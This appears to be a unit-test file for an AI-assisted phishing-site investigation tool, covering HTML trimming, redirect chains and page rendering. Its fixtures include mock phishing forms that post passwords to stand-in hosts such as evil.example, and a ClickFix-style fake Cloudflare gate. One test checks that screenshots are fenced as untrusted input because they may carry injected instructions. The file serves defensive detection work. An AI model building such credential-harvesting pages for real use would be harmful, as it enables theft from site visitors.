"""Unit tests for the investigation evidence tools."""

from __future__ import annotations

from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

import pytest

from infrastructure.browser_run import BrowserRunClient, RenderResult
from services.safety.tools import (
    InvestigationToolDeps,
    build_investigation_tools,
    last_render_screenshot,
    reset_last_render,
    resolve_chain_impl,
    trim_html,
)


class TestTrimHtml:
    def test_extracts_the_judgment_surface(self):
        html = """
        <html><head><title>Secure Bank Login</title>
        <meta name="description" content="Log in to your account">
        <script src="https://cdn.evil.example/kit.js"></script>
        <style>body{color:red}</style></head>
        <body><h1>Welcome</h1>
        <form action="https://collect.evil.example/post">
          <input type="text" name="username">
          <input type="password" name="password">
        </form>
        <script>var hidden = "never visible";</script>
        <p>Please verify your identity.</p></body></html>
        """
        out = trim_html(html)
        assert "title: Secure Bank Login" in out
        assert "meta description: Log in to your account" in out
        assert "action=https://collect.evil.example/post" in out
        assert "password:password" in out
        assert "cdn.evil.example" in out
        assert "Please verify your identity." in out
        # script/style contents never reach the visible text
        assert "never visible" not in out
        assert "color:red" not in out

    def test_visible_text_is_capped(self):
        html = "<body>" + ("word " * 5000) + "</body>"
        out = trim_html(html)
        assert len(out) < 4000

    def test_hostile_markup_keeps_what_parsed(self):
        assert "title:" in trim_html("<title>ok</title><form><<<%%%")


class TestResolveChain:
    @pytest.mark.asyncio
    async def test_private_address_hop_is_refused(self):
        from infrastructure.safe_fetch import FetchHardError

        with patch(
            "services.safety.tools.resolve_public_ip",
            AsyncMock(side_effect=FetchHardError("not public")),
        ):
            out = await resolve_chain_impl("https://internal.example/x")
        assert "refused" in out
        assert "hop 1" in out

    @pytest.mark.asyncio
    async def test_walks_hops_and_flags_cross_domain(self):
        responses = [
            SimpleNamespace(
                status_code=301,
                is_redirect=True,
                headers={"location": "https://final-dest.net/page"},
            ),
            SimpleNamespace(
                status_code=200,
                is_redirect=False,
                headers={"content-type": "text/html"},
            ),
        ]
        client = AsyncMock()
        client.head = AsyncMock(side_effect=responses)
        client.__aenter__ = AsyncMock(return_value=client)
        client.__aexit__ = AsyncMock(return_value=False)
        with (
            patch(
                "services.safety.tools.resolve_public_ip",
                AsyncMock(return_value="93.184.216.34"),
            ),
            patch("services.safety.tools.httpx.AsyncClient", return_value=client),
        ):
            out = await resolve_chain_impl("https://start-src.com/r")
        assert "hop 1" in out and "[cross-domain]" in out
        assert "final: https://final-dest.net/page → HTTP 200" in out
        # The model is always told what this tool cannot see.
        assert "JS and meta redirects are invisible" in out

    @pytest.mark.asyncio
    async def test_hop_ceiling_stops_infinite_loops(self):
        loop_response = SimpleNamespace(
            status_code=302,
            is_redirect=True,
            headers={"location": "https://loop.example/again"},
        )
        client = AsyncMock()
        client.head = AsyncMock(return_value=loop_response)
        client.__aenter__ = AsyncMock(return_value=client)
        client.__aexit__ = AsyncMock(return_value=False)
        with (
            patch(
                "services.safety.tools.resolve_public_ip",
                AsyncMock(return_value="93.184.216.34"),
            ),
            patch("services.safety.tools.httpx.AsyncClient", return_value=client),
        ):
            out = await resolve_chain_impl("https://loop.example/start")
        assert "exceeded 10 hops" in out


def _deps(**overrides) -> InvestigationToolDeps:
    browser = AsyncMock(spec=BrowserRunClient)
    feed_repo = AsyncMock()
    feed_repo.contains = AsyncMock(return_value=False)
    defaults = dict(
        browser=browser, http=AsyncMock(), feed_repo=feed_repo, web_risk=None
    )
    defaults.update(overrides)
    return InvestigationToolDeps(**defaults)


class TestFetchPageTool:
    @pytest.mark.asyncio
    async def test_result_names_its_egress(self):
        deps = _deps()
        deps.browser.snapshot = AsyncMock(
            return_value=RenderResult(
                url="https://x.example", html="<title>Hi</title>", screenshot=b""
            )
        )
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )
        out = await fetch_page("https://x.example")
        assert "rendered via cloudflare datacenter" in out.lower()
        assert "title: Hi" in out

    @pytest.mark.asyncio
    async def test_dead_render_reads_as_missing_evidence_not_clean(self):
        deps = _deps()
        deps.browser.snapshot = AsyncMock(return_value=None)
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )
        out = await fetch_page("https://x.example")
        assert "missing evidence" in out
        assert "clean" in out  # explicitly told NOT to read absence as clean


class TestFeedLookupTool:
    @pytest.mark.asyncio
    async def test_hit_reports_hard_signal(self):
        deps = _deps()
        deps.feed_repo.contains = AsyncMock(
            side_effect=lambda feed, dom: feed == "fishfish"
        )
        feed_lookup = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "feed_lookup"
        )
        out = await feed_lookup("evil.example")
        assert "HARD HITS" in out and "feed:fishfish" in out

    @pytest.mark.asyncio
    async def test_clean_host_reports_no_hits(self):
        feed_lookup = next(
            t for t in build_investigation_tools(_deps()) if t.__name__ == "feed_lookup"
        )
        assert "no feed or Web Risk hits" in await feed_lookup("fine.example")


class TestBrowserRunClient:
    @pytest.mark.asyncio
    async def test_unconfigured_returns_none(self):
        client = BrowserRunClient(AsyncMock(), account_id="", api_token="")
        assert await client.snapshot("https://x.example") is None

    @pytest.mark.asyncio
    async def test_snapshot_decodes_result(self):
        import base64

        http = AsyncMock()
        http.post = AsyncMock(
            return_value=SimpleNamespace(
                raise_for_status=lambda: None,
                json=lambda: {
                    "result": {
                        "content": "<title>ok</title>",
                        "screenshot": base64.b64encode(b"webpbytes").decode(),
                    }
                },
            )
        )
        client = BrowserRunClient(http, account_id="acc", api_token="tok")
        result = await client.snapshot("https://x.example")
        assert result is not None
        assert result.html == "<title>ok</title>"
        assert result.screenshot == b"webpbytes"
        # The auth header rides the request; the URL names the account.
        args, kwargs = http.post.await_args
        assert "acc/browser-rendering/snapshot" in args[0]
        assert kwargs["headers"]["Authorization"] == "Bearer tok"

    @pytest.mark.asyncio
    async def test_api_failure_returns_none(self):
        http = AsyncMock()
        http.post = AsyncMock(side_effect=RuntimeError("cf down"))
        client = BrowserRunClient(http, account_id="acc", api_token="tok")
        assert await client.snapshot("https://x.example") is None


class TestTrimHtmlBudget:
    """Live-run finding: an uncapped forms line dwarfed every other piece
    of evidence and helped push one investigation past 60k tokens."""

    def test_hidden_fields_are_counted_not_listed(self):
        html = (
            "<form action=/session>"
            + "".join(f"<input type=hidden name=csrf_{i}>" for i in range(14))
            + "<input type=text name=login><input type=password name=password>"
            "</form>"
        )
        out = trim_html(html)
        assert "password:password" in out  # the discriminator survives
        assert "14 hidden" in out
        assert "csrf_1" not in out  # noise does not

    def test_form_and_script_host_counts_are_capped(self):
        html = "".join(f"<form action=/f{i}><input name=x></form>" for i in range(9))
        html += "".join(
            f'<script src="https://cdn{i}.example.com/a.js"></script>'
            for i in range(20)
        )
        out = trim_html(html)
        assert "more forms)" in out
        assert "more)" in out

    def test_real_world_login_page_stays_small(self):
        """A page with many forms and fields must still fit a token budget."""
        html = "<title>Sign in</title>" + "".join(
            "<form action=/session>"
            + "".join(f"<input type=hidden name=h{j}>" for j in range(16))
            + "<input type=password name=password></form>"
            for _ in range(6)
        )
        assert len(trim_html(html)) < 1200


def _timeout_error():
    import httpx

    request = httpx.Request("POST", "https://api.cloudflare.com/x")
    response = httpx.Response(422, text='{"errors":[{"code":6002}]}', request=request)
    return httpx.HTTPStatusError("422", request=request, response=response)


class TestWaitLadder:
    """networkidle0 demands zero in-flight requests, so a live page with an
    analytics beacon times out. Measured on nauratimm.net: dead on the first
    condition, 88KB on the second. One flaky wait must not become a verdict."""

    @staticmethod
    def _http(fail_first: int):
        import base64

        calls = {"n": 0}

        async def post(*args, **kwargs):
            calls["n"] += 1
            if calls["n"] <= fail_first:
                raise _timeout_error()
            return SimpleNamespace(
                raise_for_status=lambda: None,
                json=lambda: {
                    "result": {
                        "content": "<title>Naura Timm</title>",
                        "screenshot": base64.b64encode(b"shot").decode(),
                    }
                },
            )

        http = AsyncMock()
        http.post = post
        return http, calls

    @pytest.mark.asyncio
    async def test_second_condition_recovers_the_page(self):
        http, calls = self._http(fail_first=1)
        client = BrowserRunClient(http, account_id="acc", api_token="tok")

        result = await client.snapshot("https://nauratimm.net/")

        assert result is not None
        assert result.html == "<title>Naura Timm</title>"
        assert calls["n"] == 2

    @staticmethod
    def _recording_http(fail_first: int):
        """Same as _http but keeps every gotoOptions the client sent."""
        import base64

        sent: list[str] = []

        async def post(*args, **kwargs):
            sent.append(kwargs["json"]["gotoOptions"]["waitUntil"])
            if len(sent) <= fail_first:
                raise _timeout_error()
            return SimpleNamespace(
                raise_for_status=lambda: None,
                json=lambda: {
                    "result": {
                        "content": "<title>ok</title>",
                        "screenshot": base64.b64encode(b"shot").decode(),
                    }
                },
            )

        http = AsyncMock()
        http.post = post
        return http, sent

    @pytest.mark.asyncio
    async def test_networkidle0_is_never_requested(self):
        """It is the condition that fails on live pages, so it is gone."""
        http, sent = self._recording_http(fail_first=99)
        client = BrowserRunClient(http, account_id="acc", api_token="tok")

        await client.snapshot("https://x.example")

        assert sent == ["networkidle2", "domcontentloaded"]

    @pytest.mark.asyncio
    async def test_a_first_try_success_never_reaches_the_fallback(self):
        http, sent = self._recording_http(fail_first=0)
        client = BrowserRunClient(http, account_id="acc", api_token="tok")

        assert await client.snapshot("https://x.example") is not None
        assert sent == ["networkidle2"]

    @pytest.mark.asyncio
    async def test_every_condition_failing_is_still_absent_evidence(self):
        http, calls = self._http(fail_first=99)
        client = BrowserRunClient(http, account_id="acc", api_token="tok")

        assert await client.snapshot("https://dg-bbs.com/") is None
        assert calls["n"] == 2


class TestEmbeddedAndChallenge:
    def test_frameset_target_is_surfaced(self):
        """edanmed.com is 340 bytes of frameset. Without this the model is
        told "no content" while the HTML names where the content lives."""
        html = (
            "<html><head><title>EDANMED.COM</title></head>"
            '<frameset rows="100%,*"><frame src="http://www.edanusa.com">'
            "</frameset></html>"
        )
        out = trim_html(html)
        assert "embedded destinations: frame src=http://www.edanusa.com" in out

    def test_meta_refresh_target_is_surfaced(self):
        html = (
            '<html><head><meta http-equiv="refresh" '
            'content="0;url=https://evil.example/login"></head></html>'
        )
        assert "meta refresh=0;url=https://evil.example/login" in trim_html(html)

    def test_real_provider_challenge_is_named_as_missing_evidence(self):
        """kisalt.com renders 27KB of this and nothing of the actual site. The
        real one always loads Cloudflare's challenge-platform script."""
        html = (
            "<html><head><title>Just a moment...</title>"
            '<script src="/cdn-cgi/challenge-platform/h/b/orchestrate/chl_page/v1"></script>'
            "</head><body>Enable JavaScript and cookies to continue</body></html>"
        )
        out = trim_html(html)
        assert "real challenge provider script is loaded" in out
        assert "MISSING evidence" in out
        assert "fake gate" not in out

    def test_challenge_wording_without_a_provider_is_a_fake_gate(self):
        """A ClickFix kit that copies Cloudflare's wording verbatim is
        formless and thin by construction. Calling that missing evidence
        would talk the model out of the verdict the fake-gate rule asks for.
        The tell is the one thing the kit did not do: load a provider."""
        html = (
            "<html><head><title>Just a moment...</title>"
            '<script src="https://static.cloudflareinsights.com/beacon.min.js"></script>'
            "</head><body>Verifying you are human. This may take a few seconds.</body></html>"
        )
        out = trim_html(html)
        assert "NO challenge provider script is loaded" in out
        assert "hand-drawn fake gate: POSITIVE evidence" in out
        assert "MISSING evidence" not in out

    def test_recaptcha_and_turnstile_count_as_real_providers(self):
        for src in (
            "https://www.google.com/recaptcha/api.js",
            "https://js.hcaptcha.com/1/api.js",
            "https://challenges.cloudflare.com/turnstile/v0/api.js",
        ):
            html = (
                f'<html><head><title>Checking your browser</title><script src="{src}"></script></head>'
                "<body>Please verify you are a human</body></html>"
            )
            assert "real challenge provider script is loaded" in trim_html(html), src

    def test_challenge_words_on_a_page_with_a_form_do_not_discount_it(self):
        """The markers are attacker-controlled text. A scam page that hides
        "verifying you are human" in a corner still shows its credential
        form and must stay judgeable, not be talked down to uncertain."""
        html = (
            "<html><head><title>Bank Login</title></head><body>"
            '<form action="https://evil.example/steal"><input type="password" name="pw"></form>'
            "<p>Enter your details to continue.</p>"
            "<small>verifying you are human</small></body></html>"
        )
        out = trim_html(html)
        assert "challenge" not in out
        assert "password:pw" in out

    def test_an_ordinary_page_is_not_called_a_challenge(self):
        html = "<html><head><title>Naura Timm</title></head><body>Obras</body></html>"
        out = trim_html(html)
        assert "challenge" not in out
        assert "embedded destinations: none" in out


class TestScreenshotReachesTheModel:
    @pytest.mark.asyncio
    async def test_screenshot_rides_along_as_image_content(self):
        from pydantic_ai.messages import BinaryContent, ToolReturn

        deps = _deps()
        deps.browser.snapshot = AsyncMock(
            return_value=RenderResult(
                url="https://x.example", html="<title>Hi</title>", screenshot=b"webp!"
            )
        )
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )

        out = await fetch_page("https://x.example")

        assert isinstance(out, ToolReturn)
        assert len(out.content) == 1
        image = out.content[0]
        assert isinstance(image, BinaryContent)
        assert image.data == b"webp!"
        assert image.media_type == "image/webp"

    @pytest.mark.asyncio
    async def test_the_fence_covers_the_image_too(self):
        """A screenshot can carry instruction-shaped text as easily as
        markup can, so the untrusted fence has to name it."""
        from pydantic_ai.messages import ToolReturn

        deps = _deps()
        deps.browser.snapshot = AsyncMock(
            return_value=RenderResult(
                url="https://x.example", html="<title>Hi</title>", screenshot=b"webp!"
            )
        )
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )

        out = await fetch_page("https://x.example")

        assert isinstance(out, ToolReturn)
        assert "attached screenshot is UNTRUSTED" in out.return_value
        assert "title: Hi" in out.return_value

    @pytest.mark.asyncio
    async def test_no_screenshot_stays_a_plain_string(self):
        deps = _deps()
        deps.browser.snapshot = AsyncMock(
            return_value=RenderResult(
                url="https://x.example", html="<title>Hi</title>", screenshot=b""
            )
        )
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )

        out = await fetch_page("https://x.example")

        assert isinstance(out, str)


class TestRenderEdgeCases:
    @pytest.mark.asyncio
    async def test_empty_content_and_empty_screenshot_is_absent_evidence(self):
        http = AsyncMock()
        http.post = AsyncMock(
            return_value=SimpleNamespace(
                raise_for_status=lambda: None,
                json=lambda: {"result": {"content": "", "screenshot": ""}},
            )
        )
        client = BrowserRunClient(http, account_id="acc", api_token="tok")
        assert await client.snapshot("https://x.example") is None

    def test_embedded_destinations_are_capped(self):
        frames = "".join(
            f'<iframe src="https://f{i}.example/"></iframe>' for i in range(6)
        )
        out = trim_html(f"<html><body>{frames}</body></html>")
        assert "iframe src=https://f3.example/" in out
        assert "(+2 more)" in out


class TestRetryOnlyOnWaitTimeout:
    """A dead host fails identically under every wait condition, so a second
    Browser Run call for it is pure cost. Only a 6002 goto timeout earns the
    next rung of the ladder."""

    @staticmethod
    def _http(error_text: str):
        import httpx

        calls = {"n": 0}

        async def post(*args, **kwargs):
            calls["n"] += 1
            request = httpx.Request("POST", "https://api.cloudflare.com/x")
            response = httpx.Response(422, text=error_text, request=request)
            raise httpx.HTTPStatusError("422", request=request, response=response)

        http = AsyncMock()
        http.post = post
        return http, calls

    @pytest.mark.asyncio
    async def test_dead_host_is_not_retried(self):
        http, calls = self._http(
            '{"errors":[{"code":5006,"message":"Network connection closed."}]}'
        )
        client = BrowserRunClient(http, account_id="acc", api_token="tok")
        assert await client.snapshot("https://dg-bbs.com/") is None
        assert calls["n"] == 1

    @pytest.mark.asyncio
    async def test_wait_timeout_earns_the_next_rung(self):
        http, calls = self._http(
            '{"errors":[{"code":6002,"message":"A timeout was reached."}]}'
        )
        client = BrowserRunClient(http, account_id="acc", api_token="tok")
        assert await client.snapshot("https://nauratimm.net/") is None
        assert calls["n"] == 2


class TestLastRenderStash:
    @staticmethod
    def _fetch_page(shots: dict[str, bytes]):
        async def snapshot(url):
            return RenderResult(url=url, html="<title>x</title>", screenshot=shots[url])

        deps = _deps()
        deps.browser.snapshot = AsyncMock(side_effect=snapshot)
        return next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )

    @pytest.mark.asyncio
    async def test_fetch_page_leaves_its_screenshot_for_the_embed(self):
        from services.safety.tools import last_render_screenshot, reset_last_render

        reset_last_render()
        fetch_page = self._fetch_page({"https://x.example/p": b"px"})

        await fetch_page("https://x.example/p")

        assert last_render_screenshot() == b"px"

    @pytest.mark.asyncio
    async def test_the_judged_url_wins_over_a_later_root_fetch(self):
        """Example 10's sequence: fetch the fake gate, then fetch the root,
        which returns "Cannot GET /". Last-wins would put the blank root
        beside a reason that describes the gate."""
        from services.safety.tools import last_render_screenshot, reset_last_render

        reset_last_render()
        fetch_page = self._fetch_page(
            {
                "https://5347567.shop/197721937": b"GATE",
                "https://5347567.shop/": b"BLANK",
            }
        )

        await fetch_page("https://5347567.shop/197721937")
        await fetch_page("https://5347567.shop/")

        assert last_render_screenshot("https://5347567.shop/197721937") == b"GATE"
        assert last_render_screenshot("https://5347567.shop/197721937?utm=1") == b"GATE"
        assert last_render_screenshot() == b"BLANK"  # no preference: most recent

    @pytest.mark.asyncio
    async def test_unmatched_preference_falls_back_to_the_most_recent(self):
        from services.safety.tools import last_render_screenshot, reset_last_render

        reset_last_render()
        fetch_page = self._fetch_page(
            {"https://x.example/a": b"A", "https://x.example/b": b"B"}
        )
        await fetch_page("https://x.example/a")
        await fetch_page("https://x.example/b")

        assert last_render_screenshot("https://elsewhere.example/") == b"B"

    @pytest.mark.asyncio
    async def test_reset_clears_the_previous_investigation(self):
        from services.safety.tools import last_render_screenshot, reset_last_render

        reset_last_render()
        fetch_page = self._fetch_page({"https://x.example/p": b"px"})
        await fetch_page("https://x.example/p")
        assert last_render_screenshot() == b"px"

        reset_last_render()

        assert last_render_screenshot() == b""
        assert last_render_screenshot("https://x.example/p") == b""


class TestFetchPageProbe:
    """With the probe browser, fetch_page reports what the page DID and
    attaches both renders; without it, or when it fails, the one-shot
    Cloudflare snapshot still answers."""

    def _probe_result(self, **over):
        from infrastructure.browser_probe import ProbeResult

        base = dict(
            url="https://x.example",
            final_url="https://x.example/",
            html="<title>Watch</title>",
            screenshot=b"\xff\xd8\xffbefore",
            screenshot_after=b"\xff\xd8\xffafter",
            media_type="image/jpeg",
            observations="click 1: video 'Play' → opened pop-up https://ads.example/x [cross-domain]",
        )
        base.update(over)
        return ProbeResult(**base)

    @pytest.mark.asyncio
    async def test_observations_and_both_shots_reach_the_model(self):
        probe = AsyncMock()
        probe.probe = AsyncMock(return_value=self._probe_result())
        deps = _deps(probe=probe)
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )
        reset_last_render()
        out = await fetch_page("https://x.example")
        assert "## Observed behaviour" in out.return_value
        assert "opened pop-up https://ads.example/x" in out.return_value
        assert "rendered via our own browser" in out.return_value
        assert [c.data for c in out.content] == [
            b"\xff\xd8\xffbefore",
            b"\xff\xd8\xffafter",
        ]
        assert all(c.media_type == "image/jpeg" for c in out.content)
        # The embed shows what a visitor sees first, not the post-click state.
        assert last_render_screenshot("https://x.example") == b"\xff\xd8\xffbefore"
        deps.browser.snapshot.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_dead_probe_falls_back_to_snapshot(self):
        probe = AsyncMock()
        probe.probe = AsyncMock(return_value=None)
        deps = _deps(probe=probe)
        deps.browser.snapshot = AsyncMock(
            return_value=RenderResult(
                url="https://x.example", html="<title>Hi</title>", screenshot=b""
            )
        )
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )
        out = await fetch_page("https://x.example")
        assert "rendered via cloudflare datacenter" in out.lower()
        assert "Observed behaviour" not in out

    @pytest.mark.asyncio
    async def test_identical_after_shot_is_not_attached_twice(self):
        probe = AsyncMock()
        probe.probe = AsyncMock(return_value=self._probe_result(screenshot_after=b""))
        deps = _deps(probe=probe)
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )
        reset_last_render()
        out = await fetch_page("https://x.example")
        assert len(out.content) == 1
        assert "screenshot: attached" in out.return_value


class TestTerminalUrl:
    @pytest.mark.asyncio
    async def test_returns_where_the_chain_ends(self):
        from services.safety.tools import terminal_url_impl

        responses = [
            SimpleNamespace(
                status_code=302,
                is_redirect=True,
                headers={"location": "https://final-dest.net/page"},
            ),
            SimpleNamespace(
                status_code=200,
                is_redirect=False,
                headers={"content-type": "text/html"},
            ),
        ]
        client = AsyncMock()
        client.head = AsyncMock(side_effect=responses)
        client.__aenter__ = AsyncMock(return_value=client)
        client.__aexit__ = AsyncMock(return_value=False)
        with (
            patch(
                "services.safety.tools.resolve_public_ip",
                AsyncMock(return_value="93.184.216.34"),
            ),
            patch("services.safety.tools.httpx.AsyncClient", return_value=client),
        ):
            assert (
                await terminal_url_impl("https://start-src.com/r")
                == "https://final-dest.net/page"
            )

    @pytest.mark.asyncio
    async def test_refused_or_failed_chain_is_none(self):
        from infrastructure.safe_fetch import FetchHardError
        from services.safety.tools import terminal_url_impl

        with patch(
            "services.safety.tools.resolve_public_ip",
            AsyncMock(side_effect=FetchHardError("not public")),
        ):
            assert await terminal_url_impl("https://internal.example/x") is None


class TestFetchPageLandedUrl:
    @pytest.mark.asyncio
    async def test_redirected_probe_names_the_page_it_landed_on(self):
        from infrastructure.browser_probe import ProbeResult

        probe = AsyncMock()
        probe.probe = AsyncMock(
            return_value=ProbeResult(
                url="https://short.example/x",
                final_url="https://landing.example/kit",
                html="<title>Kit</title>",
                screenshot=b"",
                screenshot_after=b"",
                media_type="image/jpeg",
                observations="loaded: ...",
            )
        )
        deps = _deps(probe=probe)
        fetch_page = next(
            t for t in build_investigation_tools(deps) if t.__name__ == "fetch_page"
        )
        out = await fetch_page("https://short.example/x")
        assert "url: https://short.example/x" in out
        assert (
            "landed on: https://landing.example/kit (everything below is that page)"
            in out
        )
